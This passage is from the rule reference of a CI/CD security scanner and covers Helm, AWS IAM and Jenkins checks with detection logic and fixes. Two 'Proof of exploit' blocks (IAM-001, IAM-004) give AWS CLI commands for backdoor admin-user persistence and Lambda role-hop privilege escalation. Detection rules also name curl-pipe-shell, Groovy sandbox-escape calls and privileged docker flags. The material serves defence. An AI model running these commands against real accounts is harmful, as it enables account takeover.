**How this is detected.** Reads ``Chart.lock``'s top-level ``generated:`` timestamp (an ISO-8601 string Helm writes when the lock was last regenerated) and compares against ``now``. Fires when the delta is more than 90 days. Charts without ``Chart.lock`` are skipped. HELM-002 covers the missing-lock case directly. Charts whose ``generated:`` field is malformed or absent silently pass on this rule (HELM-002 covers the absent-lock case from a different angle).

**Recommendation.** Run ``helm dependency update`` against every dependency-carrying chart at least once per release cycle, and commit the regenerated ``Chart.lock``. The lock pins versions and digests; the *update cadence* is what brings in CVE fixes and deprecation notices from the last quarter. CI can run the same command against ``main`` weekly to surface drift as a PR rather than letting the lock sit stale until the next release.

**Known false positives.**

- A chart that pins exact versions and never needs new dependencies (e.g. a chart packaging a single internal library that itself updates rarely) may legitimately have a stale Chart.lock. Suppress with ``--ignore-file`` when this matches your situation.

**Source:** [`HELM-008`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-009`: Chart home / sources URL uses a non-HTTPS scheme <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-009 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Walks ``Chart.yaml`` ``home:`` (single string) and ``sources:`` (list of strings). Fires on any value whose scheme is ``http://``, ``ftp://``, or other plaintext form. Empty / missing fields pass, the rule only evaluates URLs that are *populated* with the wrong scheme. HELM-003 covers the same risk for dependency-repo URLs.

**Recommendation.** Switch every ``home:`` URL and every entry in ``sources:`` to ``https://``. Most chart-listing UIs display these as click-through links from a public chart registry; serving them over plaintext is a confused-deputy footgun for anyone evaluating the chart's provenance. ``http://`` URLs against ``localhost`` are not exempted, production charts shouldn't ship references to a developer-local endpoint anyway.

**Source:** [`HELM-009`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-010`: Chart.yaml appVersion field is empty or missing <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-010 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Library charts (``Chart.yaml`` ``type: library``) legitimately don't have an ``appVersion`` because they package no application. Those are exempted. For application charts (``type: application``, the default), ``appVersion`` is required for CVE tracking and release-tracking; without it, ``helm list`` shows ``-`` in the AppVersion column and downstream consumers have no signal.

**Recommendation.** Set ``appVersion:`` in ``Chart.yaml`` to the version of the application the chart packages (e.g. ``appVersion: "17.2"`` for a Postgres-17.2 chart at ``version: 1.4.2``). When the upstream application releases, bump ``appVersion`` and re-cut the chart. Helm's CLI displays ``appVersion`` alongside the chart version in ``helm list``, so downstream operators can see which app version is running where.

**Source:** [`HELM-010`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `IAM-000`: IAM API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-iam-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`IAM-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `IAM-001`: CI/CD role has AdministratorAccess policy attached <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-iam-001 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** A CI/CD service role with ``AdministratorAccess`` attached turns any pipeline compromise into account compromise. The classic anti-pattern: the role started narrow, the pipeline grew, someone attached AdministratorAccess to unblock a deploy, and it never came off.

**Recommendation.** Replace AdministratorAccess with least-privilege policies.

**Proof of exploit.**

```
# Vulnerable: CodeBuild service role with AdministratorAccess.
# (Terraform shown for clarity; the actual finding comes from
# live ListAttachedRolePolicies on the role.)
resource "aws_iam_role" "codebuild" {
  name               = "codebuild-deploy"
  assume_role_policy = data.aws_iam_policy_document.cb_trust.json
}
resource "aws_iam_role_policy_attachment" "admin" {
  role       = aws_iam_role.codebuild.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# Attack: any compromise of the build (poisoned dependency,
# leaked buildspec edit, malicious PR merged to the branch
# CodeBuild trusts) runs as a principal with full account
# permissions. From a build shell:
#
#   aws iam create-user --user-name persistence
#   aws iam attach-user-policy --user-name persistence \
#     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
#   aws iam create-access-key --user-name persistence
#
# Game over: out-of-band admin, no IP gate, survives every
# subsequent rotation of the CodeBuild role itself.

# Safe: scope the role to the resources the pipeline actually
# touches. ``AdministratorAccess`` is never the right answer
# for an automation principal.
resource "aws_iam_role_policy" "codebuild_least_priv" {
  role   = aws_iam_role.codebuild.id
  policy = data.aws_iam_policy_document.deploy_specific.json
}
```

**Source:** [`IAM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `IAM-002`: CI/CD role has wildcard Action in attached policy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-002 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** ``Action: '*'`` (or service-prefix wildcards like ``s3:*``) on an attached policy is functionally equivalent to AdministratorAccess for that resource. The wildcard absorbs every new IAM action AWS adds, so the role's authority grows without any local change.

**Recommendation.** Replace wildcard actions with specific IAM actions.

**Source:** [`IAM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `IAM-003`: CI/CD role has no permission boundary <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-iam-003 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** A permissions boundary is the maximum-permission ceiling for a role. Without one, every future PR that attaches another inline / managed policy raises the role's effective authority indefinitely. With a boundary in place, the policy churn happens beneath a fixed cap that your security team owns separately.

**Recommendation.** Attach a permissions boundary defining max permissions.

**Source:** [`IAM-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `IAM-004`: CI/CD role can PassRole to any role <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-004 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** ``iam:PassRole`` with ``Resource: '*'`` lets the principal hand any role to any service. Combined with a service that runs your code (Lambda, ECS, CodeBuild, EC2 Instance Profiles), this is role-hop privilege escalation: launch an ephemeral resource configured with a higher-privileged role, run code under that identity, exfil. Scoping by ARN + ``iam:PassedToService`` removes the escalation path.

**Recommendation.** Restrict iam:PassRole to specific role ARNs and add an iam:PassedToService condition.

**Proof of exploit.**

```
# Vulnerable: pipeline role grants PassRole with Resource: '*'.
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["iam:PassRole", "lambda:CreateFunction",
                "lambda:InvokeFunction"],
    "Resource": "*"
  }]
}

# Attack: from a build shell, create a Lambda configured with
# the highest-privileged role you can name and invoke it:
#
#   aws lambda create-function --function-name pwn \
#     --role arn:aws:iam::123456789012:role/prod-admin \
#     --runtime python3.12 --handler i.h \
#     --zip-file fileb://payload.zip
#   aws lambda invoke --function-name pwn /tmp/out
#
# The Lambda now runs as ``prod-admin`` even though the
# pipeline principal never had that role's permissions
# directly. Classic role-hop privilege escalation.

# Safe: pin to one role ARN AND require the pass be scoped
# to the service that legitimately consumes it.
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::123456789012:role/lambda-deploy-target",
  "Condition": {
    "StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}
  }
}
```

**Source:** [`IAM-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `IAM-005`: CI/CD role trust policy missing sts:ExternalId <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-005 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens, [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** A trust policy that lets an external AWS account assume the role without an ``sts:ExternalId`` condition is vulnerable to the confused-deputy pattern: a third-party SaaS configured with your role ARN can also be used by another customer of that SaaS to assume your role (if they know the ARN). ``sts:ExternalId`` ties the role to a specific tenancy.

**Recommendation.** Add a Condition requiring sts:ExternalId for external principals.

**Source:** [`IAM-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `IAM-006`: Sensitive actions granted with wildcard Resource <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-iam-006 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** IAM-002 catches ``Action: "*"``. IAM-006 catches the more common "scoped action, unscoped resource" pattern on sensitive services (S3/KMS/SecretsManager/SSM/IAM/STS/DynamoDB/Lambda/EC2).

**Recommendation.** Scope the Resource element to specific ARNs (buckets, keys, secrets, roles).

**Source:** [`IAM-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `IAM-007`: IAM user has access key older than 90 days <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-007 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Every user in the account is evaluated. CI/CD tooling that still uses IAM users (older Jenkins agents, GitHub Actions pre-OIDC, third-party schedulers) shows up here. The 90-day window matches the common compliance baseline; rotate sooner if the key is used from on-prem or an untrusted runner.

**Recommendation.** Rotate or delete IAM access keys older than 90 days. Long-lived static credentials are the #1 way compromised CI credentials get reused across environments, prefer short-lived STS tokens via OIDC federation or an assumed role.

**Source:** [`IAM-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `IAM-008`: OIDC-federated role trust policy missing audience or subject pin <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-008 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens, [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** IAM-005 already covers cross-account AWS principals. This rule targets the OIDC federation path specifically because the blast radius of a missed audience/subject pin is the entire identity provider's tenant base (e.g. all GitHub users, not just your org).

**Recommendation.** Every Allow statement that trusts a federated OIDC provider (``token.actions.githubusercontent.com``, GitLab, CircleCI, Terraform Cloud, etc.) must pin both the audience (``...:aud = sts.amazonaws.com``) and a subject prefix (``...:sub`` matching ``repo:myorg/*``). Without these, any workflow from any tenant can assume the role.

**Source:** [`IAM-008`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `JF-001`: Shared library not pinned to a tag or commit <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-001 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** `@main`, `@master`, `@develop`, no-`@ref`, and any non-semver / non-SHA ref are floating. Whoever controls the upstream library can ship code into your build by pushing to that branch.

**Recommendation.** Pin every `@Library('name@<ref>')` to a release tag (e.g. `@v1.4.2`) or a 40-char commit SHA. Configure the library in Jenkins with 'Allow default version to be overridden' disabled so a pipeline can't escape the pin.

**Source:** [`JF-001`](../providers/jenkins.md#jf-001) in the [Jenkins provider](../providers/jenkins.md).

### `JF-002`: Script step interpolates attacker-controllable env var <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-002 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** $BRANCH_NAME / $GIT_BRANCH / $TAG_NAME / $CHANGE_* are populated from SCM event metadata the attacker controls. Single-quoted Groovy strings don't interpolate so they're safe; only double-quoted / triple-double-quoted bodies are flagged.

**Recommendation.** Switch the affected `sh`/`bat`/`powershell` step to a single-quoted string (Groovy doesn't interpolate single quotes), and pass values through a quoted shell variable (`sh 'echo "$BRANCH"'` after `withEnv([...])`).

**Source:** [`JF-002`](../providers/jenkins.md#jf-002) in the [Jenkins provider](../providers/jenkins.md).

### `JF-003`: Pipeline uses `agent any` (no executor isolation) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-003 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** `agent any` is the broadest possible executor scope, any registered executor can be picked, including ones with broader IAM / file-system access than this build needs. A compromise of one job blast-radiates across every pool.

**Recommendation.** Replace `agent any` with `agent { label 'build-pool' }` (targeting a labeled pool) or `agent { docker { image '...' } }` (ephemeral container). Reserve broad-access agents for jobs that genuinely need them.

**Source:** [`JF-003`](../providers/jenkins.md#jf-003) in the [Jenkins provider](../providers/jenkins.md).

### `JF-004`: AWS auth uses long-lived access keys via withCredentials <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-004 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Fires when BOTH a credentialsId containing `aws` is referenced AND an AWS key variable name appears (requires both so an OIDC role binding doesn't false-positive). Also fires when `withAWS(credentials: '…')` is used, the safe alternative is `withAWS(role: '…')`.

**Recommendation.** Switch to the AWS plugin's IAM-role / OIDC binding (e.g. `withAWS(role: 'arn:aws:iam::…:role/jenkins')`) so each build assumes a short-lived role. Remove the static AWS_ACCESS_KEY_ID secret from the Jenkins credentials store once the role is in place.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-004`](../providers/jenkins.md#jf-004) in the [Jenkins provider](../providers/jenkins.md).

### `JF-005`: Deploy stage missing manual `input` approval <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-005 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** A stage named `deploy` / `release` / `publish` / `promote` should either use the declarative `input { ... }` directive or call `input message: ...` somewhere in its body. Without one, any push that triggers the pipeline ships to the target with no human review.

**Recommendation.** Add an `input` step to every deploy-like stage (e.g. `input message: 'Promote to prod?', submitter: 'releasers'`). Combine with a Jenkins folder-scoped permission so only release engineers see the prompt.

**Source:** [`JF-005`](../providers/jenkins.md#jf-005) in the [Jenkins provider](../providers/jenkins.md).

### `JF-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-006 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Passes when cosign / sigstore / slsa-* / notation-sign appears in executable Jenkinsfile text (comments are stripped before matching).

**Recommendation.** Add a `sh 'cosign sign --yes …'` step (the cosign-installer Jenkins plugin handles binary install). Publish the signature next to the artifact and verify it at deploy.

**Source:** [`JF-006`](../providers/jenkins.md#jf-006) in the [Jenkins provider](../providers/jenkins.md).

### `JF-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-007 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Passes when a direct SBOM tool token (CycloneDX, syft, anchore, spdx-sbom-generator, sbom-tool) appears in executable code, or when Trivy is paired with `sbom` / `cyclonedx` in the same file. Comments are stripped before matching.

**Recommendation.** Add a `sh 'syft . -o cyclonedx-json > sbom.json'` step (or Trivy with `--format cyclonedx`) and archive the result with `archiveArtifacts`.

**Source:** [`JF-007`](../providers/jenkins.md#jf-007) in the [Jenkins provider](../providers/jenkins.md).

### `JF-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-008 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Scans the raw Jenkinsfile text against the cross-provider credential-pattern catalog. Secrets committed to Groovy source are visible in every fork and every build log.

**Recommendation.** Rotate the exposed credential. Move the value to a Jenkins credential and reference it via `withCredentials([string(credentialsId: '…', variable: '…')])`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`JF-008`](../providers/jenkins.md#jf-008) in the [Jenkins provider](../providers/jenkins.md).

### `JF-009`: Agent docker image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-009 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests, [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance.

**How this is detected.** `agent { docker { image 'name:tag' } }` is not digest-pinned, so a repointed registry tag silently swaps the executor under every subsequent build. Unlike the YAML providers, Jenkins has no separate tag-pinning check, so this one fires at HIGH regardless of whether the tag is floating or immutable.

**Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and reference it via `image '<repo>@sha256:<digest>'`. Automate refreshes with Renovate.

**Source:** [`JF-009`](../providers/jenkins.md#jf-009) in the [Jenkins provider](../providers/jenkins.md).

### `JF-010`: Long-lived AWS keys exposed via environment {} block <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-010 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env, [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Flags `environment { AWS_ACCESS_KEY_ID = '...' }` when the value is a literal or plain variable reference. Skips `credentials('id')` helpers and `${env.X}` that resolve at runtime. Matches both multiline and inline `environment { ... }` forms.

**Recommendation.** Replace the literal with a credentials-store reference: `AWS_ACCESS_KEY_ID = credentials('aws-prod-key')`. Better: switch to the AWS plugin's role binding (`withAWS(role: 'arn:…')`) so the build assumes a short-lived role per run.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-010`](../providers/jenkins.md#jf-010) in the [Jenkins provider](../providers/jenkins.md).

### `JF-011`: Pipeline has no `buildDiscarder` retention policy <span class="pg-sev pg-sev--low">LOW</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-011 }

**Evidences:** [`ESF-D-BUILD-LOGS`](#ctrl-esf-d-build-logs) Generate and preserve build audit logs, [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** Without a retention policy, build logs accumulate indefinitely; a secret that once leaked into a log stays visible to anyone who can read jobs. Recognizes declarative `options { buildDiscarder(...) }`, scripted `properties([buildDiscarder(...)])`, and bare `logRotator(...)`.

**Recommendation.** Add `options { buildDiscarder(logRotator(numToKeepStr: '30', daysToKeepStr: '90')) }` (declarative) or the `properties([buildDiscarder(...)])` equivalent in scripted pipelines. Tune the numbers to your retention policy.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-011`](../providers/jenkins.md#jf-011) in the [Jenkins provider](../providers/jenkins.md).

### `JF-012`: `load` step pulls Groovy from disk without integrity pin <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-012 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** `load 'foo.groovy'` evaluates whatever exists at the path when the build runs, there's no integrity check, so a workspace mutation can swap the loaded code between runs.

**Recommendation.** Move shared Groovy into a Jenkins shared library (`@Library('name@<sha>')`). Those are version-pinned and JF-001 audits them. Reserve `load` for one-off development experiments.

**Source:** [`JF-012`](../providers/jenkins.md#jf-012) in the [Jenkins provider](../providers/jenkins.md).

### `JF-013`: copyArtifacts ingests another job's output unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-jf-013 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Recognizes both `copyArtifacts(projectName: ...)` and the older `step([$class: 'CopyArtifact', ...])` form. If the upstream job accepts multibranch or PR builds, the artifact may have been produced by attacker-controlled code.

**Recommendation.** Add a verification step before consuming the artifact: `sh 'sha256sum -c manifest.sha256'` against a manifest the producer signed, or `cosign verify` over the artifact directly. Restrict the upstream job to non-PR builds via branch protection if verification isn't feasible.

**Source:** [`JF-013`](../providers/jenkins.md#jf-013) in the [Jenkins provider](../providers/jenkins.md).

### `JF-014`: Agent label missing ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-014 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Static Jenkins agents that persist between builds leak workspace files and process state. The check looks for an `ephemeral` substring in `agent { label '...' }` blocks.

**Recommendation.** Register Jenkins agents with ephemeral lifecycle (e.g. Kubernetes pod templates or EC2 Fleet plugin) and include `ephemeral` in the label string so the pipeline declares its expectation.

**Known false positives.**

- The check looks for the literal substring ``ephemeral`` in the agent label. Teams that use a different convention (``temp``, ``runner-pool``, org-specific ARC labels) trip the rule even when their runners are auto-scaled and ephemeral in fact. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH``.

**Source:** [`JF-014`](../providers/jenkins.md#jf-014) in the [Jenkins provider](../providers/jenkins.md).

### `JF-015`: Pipeline has no `timeout` wrapper, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-015 }

**Evidences:** [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited).

**How this is detected.** Without a `timeout()` wrapper, the pipeline runs until the Jenkins controller's global timeout (or indefinitely if none is configured). Explicit timeouts cap blast radius and the window during which a compromised step has workspace access.

**Recommendation.** Wrap the pipeline body or individual stages with `timeout(time: N, unit: 'MINUTES') { … }`. Without an explicit timeout, the build runs until the Jenkins global default (or indefinitely).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-015`](../providers/jenkins.md#jf-015) in the [Jenkins provider](../providers/jenkins.md).

### `JF-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-016 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a Jenkinsfile. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the build agent.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`JF-016`](../providers/jenkins.md#jf-016) in the [Jenkins provider](../providers/jenkins.md).

### `JF-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-017 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a Jenkinsfile give the container full access to the build agent, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-017`](../providers/jenkins.md#jf-017) in the [Jenkins provider](../providers/jenkins.md).

### `JF-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-018 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a Jenkinsfile. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-018`](../providers/jenkins.md#jf-018) in the [Jenkins provider](../providers/jenkins.md).

### `JF-019`: Groovy sandbox escape pattern detected <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-jf-019 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Detects Groovy patterns that bypass the Jenkins script security sandbox: `Runtime.getRuntime()`, `Class.forName()`, `.classLoader`, `ProcessBuilder`, and `@Grab`. These give the pipeline (or an attacker who controls its source) unrestricted access to the Jenkins controller JVM, full RCE.

**Recommendation.** Remove direct Runtime/ClassLoader calls. Use Jenkins pipeline steps instead. Avoid @Grab for untrusted dependencies.

**Source:** [`JF-019`](../providers/jenkins.md#jf-019) in the [Jenkins provider](../providers/jenkins.md).

### `JF-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-020 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck. Comments are stripped before matching.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`JF-020`](../providers/jenkins.md#jf-020) in the [Jenkins provider](../providers/jenkins.md).

### `JF-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-021 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-021`](../providers/jenkins.md#jf-021) in the [Jenkins provider](../providers/jenkins.md).

### `JF-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-022 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

